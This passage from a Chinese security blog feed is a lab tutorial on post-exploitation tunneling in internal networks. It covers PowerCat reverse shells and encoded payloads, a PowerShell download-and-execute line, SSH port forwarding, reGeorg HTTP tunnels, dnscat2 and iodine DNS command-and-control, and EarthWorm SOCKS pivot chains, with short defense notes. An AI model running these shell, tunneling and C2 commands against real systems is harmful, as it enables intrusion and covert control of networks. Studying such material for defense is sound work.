title="PowerCat"></a>PowerCat</h2><p>PowerCat可以说是nc的PowerShell版本。PowerCat 可以通过执行命令回到本地运行，也可以使用远程权限运行。<br><strong>下载安装PowerCat</strong><br>打开命令行环境，执行git clone命令( 确保本地主机中安装了git 环境)下载PowerCat<br>下载完成后，在终端输入<br><code>cd powercat</code><br>即可进入PowerCat的目录。在PowerShell命令行环境中，要想使用powercat.ps1脚本，必须先进行导入操作。<br><code>Import-Module .\powercat.ps1</code></p><p>如果提示未能加载指定模块，则可能是权限问题，输入下面命令修改权限<br><code>Set-ExecutionPolicy Unrestricted</code></p><p>如果没有权限，也可以直接下载远程文件进行绕过。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX (New-Object System.Net.Webclient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>powercat的使用</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-l      监听模式</span><br><span class="line">-p      指定监听端口</span><br><span class="line">-e      指定启动进程的名称</span><br><span class="line">-v      显示详情</span><br><span class="line">-c      指定想要连接的 IP 地址</span><br><span class="line">-ep     返回 powershell</span><br><span class="line">-dns    使用 dns 通信</span><br><span class="line">-g      生成 payload</span><br><span class="line">-ge     生成经过编码的 payload，可以直接使用 powershell -e 执行该 payload</span><br></pre></td></tr></table></figure><p><strong>正向连接</strong><br>Kali 上的 nc 连接到靶机<br><code>nc -v 192.168.220.142 4444</code></p><p>靶机开启监听，等待 Kali 连接<br><code>powercat -l -v -p 4444 -e cmd.exe</code></p><p><strong>反向连接</strong><br>Kali 上开启监听<br><code>nc -lvp 4444</code></p><p>靶机向 kali 发起连接<br><code>powercat -c 192.168.220.165 -p 4444 -e cmd.exe</code></p><p><strong>返回powershell</strong><br>攻击机上运行<br><code>powercat -l -v -p 4444</code></p><p>靶机上运行<br><code>powercat -c 192.168.220.165 -p 4444 -v -ep</code></p><p><strong>powercat生成payload</strong><br>用PowerCat生成的Pylod也有正向和反向之分，且可以对其进行编码。尝试生成一个简单的Payload,在攻击机中执行如下命令。<br><code>powercat -1 -p 8000 -e cmd -v -g &gt;&gt; shell.ps1</code></p><p>将生成的psl文件上传到靶机中并执行，然后在攻击机中执行如下命令,就可以获得一个反弹 Shell。<br><code>powercat -C 191.168.52.10 -P 8000 -V</code></p><p>如果想反弹PowerShell,可以执行如下命令。<br><code>powercat -1 -P 8000 -ep -V -g &gt;&gt; shell.ps1</code></p><p>用PowerCat也可以直接生成经过编码的Payload。在攻击机中执行如下命令，即可得到经过编码的Payload。<br><code>powercat -C 192.168.52.10 -P 9999 -ep -ge</code></p><p>继续在攻击机中执行如下命令，并将Payload在靶机执行<br><code>powercat -1 -p 9999 -V</code></p><p>虽然PowerCat的作者给出的说明是在PowerShell 2.0以上版本中就可以使用这个功能，但是根据测试，在PowerShell 4.0以下版本中使用这个功能时都会报错。</p><p><strong>建立dns隧道连接</strong><br>powercat 的 dns 隧道是基于 dnscat 设计的，因此在服务端需要使用 dnscat 连接。<br>在服务端上安装 dnscat ，以 kali 为例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line"><span class="built_in">cd</span> dnscat2/server/</span><br><span class="line">gem install bundler</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure><p>命令运行完之后，执行以下命令开启服务端<br><code>ruby dnscat2.rb powercat -e open --no-cache</code></p><p>在靶机下，执行以下命令，建立 dns 隧道<br><code>powercat -c 192.168.220.165 -p 53 -dns powercat -e cmd.exe</code></p><p><strong>将PowerCat作为跳板</strong><br>测试环境为：</p><ul><li>kali 192.168.220.165</li><li>windows7 192.168.220.142&amp;&amp;192.168.52.10</li><li>win2008 192.168.52.30</li></ul><p>将 win7 作为跳板机，让 kali 通过 win7 连接到 win2008<br>在 win2008 中执行以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -v -p 4444 -e cmd.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用DNS协议：</span></span><br><span class="line">powercat -C -192.168.52.10 -p 8000 -v -e cmd.exe</span><br></pre></td></tr></table></figure><p>在 win7 中执行以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -v -p 5555 -r tcp:192.168.52.30:4444</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用DNS协议：</span></span><br><span class="line">powercat -1 -p 8000 -r dns:192.168.220.165::ttpowercat.test</span><br></pre></td></tr></table></figure><p>最后在 kali 下连接 win7</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -v 172.16.214.2 5555</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用DNS协议：</span></span><br><span class="line">ruby dnscat2.rb ttpowercat.test -e open --no-cache</span><br></pre></td></tr></table></figure><h1 id="应用层隧道技术"><a href="#应用层隧道技术" class="headerlink" title="应用层隧道技术"></a>应用层隧道技术</h1><p>应用层的隧道通信技术主要利用应用软件提供的端口来发送数据。常用的隧道协议有SSH、HTTP&#x2F;HTTPS和DNS。</p><h2 id="SSH协议"><a href="#SSH协议" class="headerlink" title="SSH协议"></a>SSH协议</h2><p>在内网中，几乎所有的Linux&#x2F;UNIX服务器和网络设备都支持SSH协议。<br>在一般情况下，SSH协议是被允许通过防火墙和边界设备的，所以经常被攻击者利用。<br>同时，SSH协议的传输过程是加密的，所以我们很难区分合法的SSH会话和攻击者利用其他网络建立的隧道。<br>攻击者使用SSH端口隧道突破防火墙的限制后，能够建立一些之前无法建立的TCP连接。</p><p>一个普通的SSH命令如下。<br><code>ssh root@192.168.1.1</code></p><p>创建SSH隧道的常用参数说明如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-C：压缩传输，提高传输速度</span><br><span class="line">-f：将SSH传输转入后台执行，不占用当前的Shell</span><br><span class="line">-N：建立静默连接(建立了连接，但是看不到具体会话)</span><br><span class="line">-g：允许远程主机连接本地用于转发的端口</span><br><span class="line">-L：本地端口转发</span><br><span class="line">-R：远程端口转发</span><br><span class="line">-D：动态转发(SOCKS代理)</span><br><span class="line">-P：指定SSH端口</span><br></pre></td></tr></table></figure><h3 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h3><p>实验环境<br><img src="/simg/tunnel_4.png" alt=" "></p><ul><li>kali攻击机：192.168.220.165</li><li>web服务器(ubuntu)：192.168.220.145、192.168.52.132</li><li>内网主机(win2003)：192.168.52.133</li></ul><p>以Web服务器192.168.220.145为跳板，将内网主机192.168.52.133 的3389端口映射到kali攻击机192.168.220.165的4444端口，再访问kali攻击机的4444端口，就可以访问192.168.52.133的3389端口了。</p><p>kali攻击机上执行如下命令，会要求输入Web服务器(跳板机)的密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L 4444(VPS端口):192.168.52.133 (目标主机):80(目标端口) root@192.168.220.145(跳板机)</span><br></pre></td></tr></table></figure><p><img src="/simg/tunnel_5.png" alt=" "><br><img src="/simg/tunnel_6.png" alt=" "><br><img src="/simg/tunnel_7.png" alt=" "></p><p>SSH进程的本地端口映射可以将本地(客户机)的某个端口转发到远端指定机器的指定端口；本地端口转发则是在本地(客户机)监听一个端口，所有访问这个端口的数据都会通过SSH隧道传输到远端的对应端口。</p><h3 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h3><p>实验环境：</p><ul><li>kali攻击机：192.168.220.165</li><li>web服务器(ubuntu)：192.168.220.145、192.168.52.132</li><li>内网主机(win2003)：192.168.52.133</li></ul><p>以Web服务器为跳板，将kali攻击机的3307端口的流量转发到内网主机的3389端口，然后访问kali攻击机的3307端口，就可以访问内网主机的3389端口了。</p><p>在Web服务器192.168.220.145上执行如下命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -R 3307(kali攻击机端口):192.168.52.133(目标主机):3389(目标端口) root@192.168.220.165(kali攻击机ip)</span><br></pre></td></tr></table></figure><p><img src="/simg/tunnel_8.png" alt=" "></p><p>在本地访问kali的3307端口，可以发现，已经与内网主机 的3389端口建立了连接<br><code>rdesktop 127.0.0.1:3307</code></p><p>本地转发是将远程主机(服务器)某个端口的数据转发到本地机器的指定端口。<br>远程端口转发则是在远程主机上监听一个端口，所有访问远程服务器指定端口的数据都会通过SSH隧道传输到本地的对应端口。</p><h3 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h3><p>实验环境：</p><ul><li>kali攻击机：192.168.220.165</li><li>web服务器(ubuntu)：192.168.220.140、192.168.52.137</li><li>内网主机(win2003)：192.168.52.133</li></ul><p>在kali攻击机上执行如下命令，建立一个动态的SOCKS 4&#x2F;5代理通道，输入Web服务器的密码。</p><p><code>ssh -CfNg -D 7000 root@192.168.220.140</code></p><p>接下来，在本地打开浏览器，设置网络代理。通过浏览器访问内网域控制器192.168.52.133<br>输入如下命令，查看本地7000端口是否已经连接。</p><p><code>netstat -tulnp 1 grep &quot;: 7000&quot;</code></p><p>动态端口映射就是建立一个SSH加密的SOCKS 4&#x2F;5代理通道。任何支持SOCKS 4&#x2F;5协议的程序都可以使用这个加密通道进行代理访问。</p><h3 id="防御SSH隧道攻击的思路"><a href="#防御SSH隧道攻击的思路" class="headerlink" title="防御SSH隧道攻击的思路"></a>防御SSH隧道攻击的思路</h3><p>SSH隧道之所以能被攻击者利用，主要是因为系统访问控制措施不够。在系统中配置SSH远程管理白名单，在ACL中限制只有特定的IP地址才能连接SSH，以及设置系统完全使用带外管理等方法，都可以避免这一问题。</p><p>如果没有足够的资源来建立带外管理的网络结构，在内网中至少要限制SSH远程登录的地址和双向访问控制策略(从外部到内部；从内部到外部)。</p><h2 id="HTTP-x2F-HTTPS协议"><a href="#HTTP-x2F-HTTPS协议" class="headerlink" title="HTTP&#x2F;HTTPS协议"></a>HTTP&#x2F;HTTPS协议</h2><p>HTTP Service代理用于将所有的流量转发到内网。常见的代理工具有reGeorg、meterpreter 、tunna等。</p><p>reGeorg是reDuh的升级版，主要功能是把内网服务器端口的数据通过HTTP/HTTPS隧道转发到本机，实现基于HTTP协议的通信。reGeorg脚本的特征非常明显，很多杀毒软件都会对其进行查杀。</p><p>reGeorg 支持ASPX、PHP、JSP 等Web脚本，并特别提供了一个Tomeat5版本。</p><p>将脚本文件上传到目标服务器中，使用Kali Linux在本地访问远程服务器上的tunnel.jsp 文件。返回后，利用reGeorgSocksProxy.py脚本监听本地的9999端口，即可建立一个通信链路。</p><p>输入如下命令，查看本地端口，可以发现9999端口已经开启了。</p><p><code>python reGeorgSocksProxy.py -u http://192.168.220.140:8080/tunnel.jsp -p 9999</code></p><p>隧道正常工作之后，可以在本地Kali Linux机器上使用ProxyChains之类的工具，访问目标内网中的资源。</p><p>传统的Web服务器通常不会将本地的3389端口开放到公网，攻击者的暴力破解行为也很容易被传统的安全设备捕获。但是，如果使用HTTP隧道进行端口转发，不仅攻击者可以直接访问Web服务器的3389端口，而且暴力破解所产生的流量的特征也不明显。因此，在日常网络维护中，需要监控HTTP隧道的情况，及时发现问题。</p><h2 id="DNS协议-1"><a href="#DNS协议-1" class="headerlink" title="DNS协议"></a>DNS协议</h2><p>DNS协议是一种请求&#x2F;应答协议，也是一种可用于应用层的隧道技术。虽然激增的DNS流量可能会被发现，但基于传统Socket隧道已经濒临淘汰及TCP、UDP通信大量被防御系统拦截的状况，DNS、ICMP、HTTP&#x2F;HTTPS 等难以被禁用的协议已成为攻击者控制隧道的主流渠道。</p><p>一方面，在网络世界中，DNS是一个必不可少的服务；另一方面，DNS报文本身具有穿透防火墙的能力。由于防火墙和入侵检测设备大都不会过滤DNS流量，也为DNS成为隐蔽信道创造了条件。越来越多的研究证明，DNS隧道在僵尸网络和APT攻击中扮演着重要的角色。</p><p>用于管理僵尸网络和进行APT攻击的服务器叫作C&amp;C服务器( Command and Control Server,命令及控制服务器)。C&amp;C节点分为两种，分别是C&amp;C服务端(攻击者)和C&amp;C客户端(被控制的计算机)。C&amp;C通信是指植入C&amp;C客户端的木马或者后门程序与C&amp;C服务端上的远程控制程序之间的通信。</p><p>正常网络之间的通信，都是在两台机器之间建立TCP连接后进行的。在进行数据通信时：如果目标是IP地址，可以直接发送报文；如果目标是域名，会先将域名解析成IP地址，再进行通信。两台机器建立连接后, C&amp;C服务端就可以将指令传递给C&amp;C客户端上的木马(后门)程序，让其受到控制。</p><p>内网中安装了各种软&#x2F;硬件防护设施来检查主机与外部网络的连接情况。很多厂商会收集C&amp;C服务端的域名、IP地址、URL等数据，帮助防火墙进行阻断操作。这样一来，C&amp;C通信就会被切断。于是，通过各种隧道技术实现C&amp;C通信的技术(特别是DNS隧道技术)出现了。</p><p>DNS隧道的工作原理很简单：在进行DNS查询时，如果查询的域名不在DNS服务器本机的缓存中，就会访问互联网进行查询，然后返回结果。如果在互联网上有一台定制的服务器，那么依靠DNS协议即可进行数据包的交换。从DNS协议的角度看，这样的操作只是在一次次地查询某个特定的域名并得到解析结果，但其本质问题是，预期的返回结果应该是一个IP地址，而事实上不是——返回的可以是任意字符串，包括加密的C&amp;C指令。</p><p>在使用DNS隧道与外部进行通信时，从表面上看是没有接连外网的(内网网关没有转发IP数据包)，但实际上，内网的DNS服务器进行了中转操作。这就是DNS隧道的工作原理，简单地说，就是将其他协议封装在DNS协议中进行传输。</p><h3 id="查看DNS的连通性"><a href="#查看DNS的连通性" class="headerlink" title="查看DNS的连通性"></a>查看DNS的连通性</h3><p>首先，需要知道当前服务器是否允许通过内部DNS解析外部域名，也就是要测试DNS的连通性。</p><p>输入如下命令，查询当前内部域名及IP地址。<br><code>cat /etc/resolv.conf|grep -v &#39;#&#39;</code></p><p>输入如下命令，查看能否与内部DNS通信。可以看到，能够解析内部域名<br><code>nslookup ad.com</code></p><p>输入如下命令,查询能否通过内部DNS服务器解析外部域名。可以看到，能够通过内部DNS服务器解析外部域名，这意味着可以使用DNS隧道实现隐蔽通信。<br><code>nslookup baidu.com</code></p><h3 id="dnscat2"><a href="#dnscat2" class="headerlink" title="dnscat2"></a>dnscat2</h3><p>nscat2是一款开源软件。它使用DNS协议创建加密的C&amp;C通道，通过预共享密钥进行身份验证；使用Shell及DNS查询类型( TXT、MX、CNAME、A. AAAA),多个同时进行的会话类似于SSH中的隧道，dnscat2 是一个命令与控制工具。</p><p>使用dnscat2隧道的模式有两种，分别是直连模式和中继模式。</p><ul><li>直连模式：客户端直接向指定IP地址的DNS服务器发起DNS解析请求。</li><li>中继模式：DNS经过互联网的迭代解析，指向指定的DNS服务器。与直连模式相比，中继模式的速度较慢。</li></ul><p>如果目标内网放行所有的DNS请求，dnscat2 会使用直连模式，通过UDP的53端口进行通信(不需要域名，速度快，而且看上去仍然像普通的DNS查询)。在请求日志中，所有的域名都是以“dnscat”开头的，因此防火墙可以很容易地将直连模式的通信检测出来。</p><p>如果目标内网中的请求仅限于白名单服务器或者特定的域, dnscat2会使用中继模式来申请一个域名，并将运行dnscat2服务端的服务器指定为受信任的DNS服务器。</p><p>dnscat2通过DNS进行控制并执行命令。与同类工具相比，dnscat2 具有如下特点。</p><ul><li>支持多个会话。</li><li>流量加密。</li><li>使用密钥防止MiTM攻击。</li><li>在内存中直接执行PowerShell脚本。</li><li>隐蔽通信。</li></ul><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><p>安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line"><span class="built_in">cd</span> dnscat2/server/</span><br><span class="line">gem install bundler</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#启动</span></span><br><span class="line">sudo ruby./dnscat2.rb abc.com --secret=123456  <span class="comment"># abc.com 自定义DNS传输的域名；--secret 自定义连接密码</span></span><br><span class="line">sudo ruby./dnscat2.rb --dns host=127.0.0.1,port=533 --secret=123456  <span class="comment">#设置监听端口</span></span><br><span class="line">sudo ruby./dnscat2.rb abc.com --secret=123456 --security=open --no-cache   <span class="comment">#--security 规定了安全级别；--no-cache 禁止缓存</span></span><br></pre></td></tr></table></figure><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><p>安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line">$ <span class="built_in">cd</span> dnscat2/client/</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnscat --secret=123456 abc.com </span><br><span class="line">dnscat --dns server=&lt;your dnscat2 server ip&gt;,port=553 --secret=123456</span><br></pre></td></tr></table></figure><p>具体的使用方法看官方手册</p><h3 id="iodine"><a href="#iodine" class="headerlink" title="iodine"></a>iodine</h3><p>碘的原子序数为53，而这恰好是DNS的端口号，故该工具被命名为“iodine”</p><p>iodine可以通过一台DNS服务器制造一个IPv4数据通道，特别适合在目标主机只能发送DNS请求的网络环境中使用。<br>iodine 是基于C语言开发的，分为服务端程序iodined 和客户端程序iodine。Kali Linux内置了iodine。<br>与同类工具相比，iodine 具有如下特点：</p><ul><li>不会对下行数据进行编码。</li><li>支持多平台，包括Linux、 BSD、Mac OS、Windows。</li><li>支持16个并发连接。</li><li>支持强制密码机制。</li><li>支持同网段隧道IP地址(不同于服务器一客户端网段)。</li><li>支持多种DNS记录类型。</li><li>提供了丰富的隧道质量检测措施。</li></ul><p>iodine支持直接转发和中继两种模式.<br>其原理是：通过TAP虚拟网卡，在服务端建立一个局域网；在客户端，通过TAP建立一个虚拟网卡；两者通过DNS隧道连接，处于同一个局域网(可以通过ping命令通信)。<br>在客户端和服务端之间建立连接后，客户机上会多出一块名为“dns0”的虚拟网卡。</p><p>具体的使用方法看官方手册</p><h3 id="防御DNS隧道攻击的方法"><a href="#防御DNS隧道攻击的方法" class="headerlink" title="防御DNS隧道攻击的方法"></a>防御DNS隧道攻击的方法</h3><p>防御隧道攻击并非易事，特别是防御DNS隧道攻击。通过如下操作，能够防御常见的隧道攻击行为。</p><ul><li>禁止网络中的任何人向外部服务器发送DNS请求，只允许与受信任的DNS服务器通信。</li><li>虽然没有人会将TXT解析请求发送给DNS服务器，但是dnscat2和邮件服务器&#x2F;网关会这样做。因此，可以将邮件服务器&#x2F;网关列入白名单并阻止传入和传出流量中的TXT请求。</li><li>跟踪用户的DNS查询次数。如果达到阈值，就生成相应的报告。</li><li>阻止ICMP</li></ul><h1 id="SOCKS代理"><a href="#SOCKS代理" class="headerlink" title="SOCKS代理"></a>SOCKS代理</h1><p>常见的网络场景有如下三类。</p><ul><li>服务器在内网中，可以任意访问外部网络。</li><li>服务器在内网中，可以访问外部网络，但服务器安装了防火墙来拒绝敏感端口的连接。</li><li>服务器在内网中，对外只开放了部分端口(例如80端口),且服务器不能访问外部网络。</li></ul><h2 id="常用的SOCKS代理工具"><a href="#常用的SOCKS代理工具" class="headerlink" title="常用的SOCKS代理工具"></a>常用的SOCKS代理工具</h2><p>SOCKS是一种代理服务，可以简单地将一端的系统连接另一端。 SOCKS支持多种协议，包括HTTP、FTP等。SOCKS分为SOCKS 4和SOCKS 5两种类型：SOCKS 4只支持TCP协议；SOCKS 5不仅支持TCP&#x2F;UDP协议，还支持各种身份验证机制等,其标准端口为1080。SOCKS能够与目标内网计算机进行通信，避免多次使用端口转发。</p><p>SOCKS代理其实可理解为增强版的lcx。它在服务端监听一个服务端口，当有新的连接请求出现时，会先从SOCKS协议中解析出目标的URL的目标端口，再执行lcx的具体功能。SOCKS代理工具有很多，在使用时要尽可能选择没有GUI界面的。此外，要尽量选择不需要安装其他依赖软件的SOCKS代理工具，能够支持多平台的工具更佳。</p><p>常用的SOCKS代理工具有：EarthWorm、reGeorg、sSocks、SocksCap64、Proxifier、ProxyChains</p><h2 id="SOCKS代理技术在网络环境中的应用"><a href="#SOCKS代理技术在网络环境中的应用" class="headerlink" title="SOCKS代理技术在网络环境中的应用"></a>SOCKS代理技术在网络环境中的应用</h2><h3 id="EarthWorm的应用"><a href="#EarthWorm的应用" class="headerlink" title="EarthWorm的应用"></a>EarthWorm的应用</h3><p>EW的使用也非常简单，共有六种命令格式，分别是ssocksd、rcsocks、 rssocks、 lcx_slave、lcx_listen、 lex_tran。 其中，用于普通网络环境的正向连接命令是ssocksd,用于反弹连接的命令是resocks、rssocks, 其他命令用于复杂网络环境的多级级联。</p><p>正向代理是指主动通过代理来访问目标机器，反向代理是指目标机器通过代理进行主动连接。</p><p>工具链接：<a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p><p><strong>测试环境：</strong><br><img src="/simg/tunnel_9.png" alt=" "></p><ul><li>kali攻击机：192.168.220.165</li><li>web服务器(win7)：192.168.220.143、192.168.52.10</li><li>内网主机(win2003)：192.168.52.20</li></ul><p>(1) 正向SOCKS 5服务器<br>以下命令适用于目标机器拥有一个外网IP地址的情况。<br><code>ew -s ssocksd -l 888</code><br>执行上述命令，即可架设一个端口为888的SOCKS代理。接下来，使用SocksCap64添加这个IP地址的代理即可。</p><p>(2) 反弹SOCKS 5服务器<br>目标机器没有公网IP地址的情况具体如下(使其可以访问内网资源)。<br>首先，将EW上传到kali攻击机中，执行如下命令。<br><code>ew -s rcsocks -l 1080 -e 888</code><br>该命令的意思是：在公网VPS上添加一个转接隧道，把1080端口收到的代理请求转发给888端口。然后，将EW上传到Web服务器中，执行如下命令。<br><code>ew -s rssocks -d 192.168.220.165 -e 888</code><br>该命令的意思是：在IP地址为192.168.220.143的服务器上启动SOCKS5服务，然后，反弹到192.168.220.165kail攻击机的888端口。<br><img src="/simg/tunnel_10.png" alt=" "></p><p>最后，可以在kali的命令行界面看到反弹成功。现在就可以通过访问192.168.220.165 kali攻击机的1080端口，使用在网络右侧IP地址为192.168.52.10的服务器上架设的SOCKS5代理服务了。</p><p>(3) 二级网络环境(a)</p><p><img src="/simg/tunnel_11.png" alt=" "></p><p>假设已经获得了A主机和B主机的控制权限。A主机配有两块网卡，一块能够连接外网，另一块(192.168.52.10)只能连接内网中的B主机，但无法访问内网中的其他资源。B主机可以访问内网资源，但无法访问外网。</p><p>首先，将EW上传到B主机中，利用ssocksd方式启动888端口的SOCKs代理，命令如下。<br><code>ew -s ssocksd -l 888</code></p><p>然后，将EW上传到A主机中，执行如下命令。<br><code>ew -s lcx_tran -l 1080 -f 10.48.128.49 -g 888</code></p><p>该命令的意思是：将1080端口收到的代理请求转发给B主机的888端口。现在就可以通过访问A主机的外网1080端口使用在B主机上架设的SOCKS5代理了。</p><p>(4) 二级网络环境(b)<br><img src="/simg/tunnel_12.png" alt=" "><br>假设已经获得了A主机和B主机的控制权限。A主机既没有公网IP地址，也无法访向内网资源。B主机可以访问内网资源，但无法访问外网。</p><p>首先，将EW上传到kali攻击机中，把1080端口收到的代理请求转发给888端口，执行如下命令。<br><code>ew -s lcx_listen -l 10800 -e 888</code></p><p>该命令的意思是：在公网kali攻击机中添加转接隧道，将10800端口收到的代理请求转发给888端口。接着，将EW上传到B主机中，并利用ssocksd方式启动999端口的SOCKS代理，命令如下。<br><code>ew -s ssocksd -l 999</code></p><p>然后，将EW上传到A主机中，执行如下命令。<br><code>ew -s lcx_slave -d 192.168.220.165 -e 888 -f 192。168.52.10 -g 999</code></p><p>该命令的意思是：在A主机上利用lcx_slave方式，将攻击机的888端口和B主机的999端口连接起来。</p><p>(5) 三级网络环境<br><img src="/simg/tunnel_12.png" alt=" "><br>三级网络环境在渗透测试中比较少见，也比较复杂。测试环境为：右侧的内网A主机没有公网IP地址，但可以访问外网；B主机不能访问外网，但可以被A主机访问; C主机可被B主机访问，而且能够访问核心区域。</p><p>首先，将EW上传到kali攻击机中，把1080端口收到的代理请求转发给888端口，执行如下命令。<br><code>ew -s rcsocks -l 1080 -e 888 </code></p><p>在A主机上执行如下命令，将kali攻击机的888端口和B主机的999端口连接起来。<br><code>ew -s lcx_slave -d 192.168.220.165 -e 888 -f &lt;主机B IP地址&gt; -g 999</code></p><p>在B主机上执行如下命令，将999端口收到的代理请求转发给777端口。<br><code>ew -s lcx_listen -l 999 -e 777</code></p><p>在C主机上启动SOCKS5服务，并反弹到B主机的777端口上，命令如下。<br><code>ew -s rssocks -d &lt;主机B IP地址&gt; -e 777</code></p><p>现在就可以通过访问kali攻击机的1080 端口使用在C主机上架设的SOCKS 5代理了</p><h3 id="在Windows下使用SocksCap64实现内网漫游"><a href="#在Windows下使用SocksCap64实现内网漫游" class="headerlink" title="在Windows下使用SocksCap64实现内网漫游"></a>在Windows下使用SocksCap64实现内网漫游</h3><p>下载并安装SocksCap64, 以管理员权限打开程序。<br><img src="/simg/tunnel_14.png" alt=" "></p><p>SocksCap64的使用方法比较简单，单击“代理”按钮，添加一个代理，然后设置代理服务器：的IP地址和端口即可。设置完成后，可以单击界面上的闪电图标按钮，测试当前代理服务器是否可以连接。<br><img src="/simg/tunnel_15.png" alt=" "><br>选择浏览器，单击右键，在弹出的快捷菜单中单击“ 在代理隧道中运行选中程序”选项，就可以自由访问内网资源了。</p><h3 id="在Linux下使用ProxyChains实现内网漫游"><a href="#在Linux下使用ProxyChains实现内网漫游" class="headerlink" title="在Linux下使用ProxyChains实现内网漫游"></a>在Linux下使用ProxyChains实现内网漫游</h3><p>Kali Linux中预装了ProxyChains, 稍加配置就可以使用。打开终端，输入如下命令。<br><code>vi /etc/proxychains.conf</code></p><p>删除“dynamic_ chain” 前面的注释符“#”。来到窗口底部，把“127.0.0.1 9050”改成想要访问的端口的信息。<br><img src="/simg/tunnel_16.png" alt=" "></p><p>测试一下代理服务器是否能正常工作。在终端输入如下命令。<br><code>proxyresolv www.baidu.com</code></p><p>此时会显示“未找到命令”的提示信息。在终端输入如下命令。<br><code>cp /usr/lib/proxychains3/proxyresolv /usr/bin/</code></p><p>再次测试代理服务器的工作是否正常。显示“OK”,表示代理服务器已经正常工作了。现在就可以访问内网了。先访问内网中的网站。在终端输入“proxychains firefox”命令，启动火狐浏览器。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.cnblogs.com/jiufang/p/16451976.html">内网渗透之隐藏通信隧道技术</a><br><a href="https://xz.aliyun.com/t/12498">网络隧道：突破内网的通行证</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;复习+学习。&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="隧道通信" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/"/>
    
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Linux内网渗透之提权</title>
    <link href="http://example.com/2023/08/28/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83/"/>
    <id>http://example.com/2023/08/28/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83/</id>
    <published>2023-08-27T16:00:00.000Z</published>
    <updated>2023-08-29T11:50:45.775Z</updated>
    
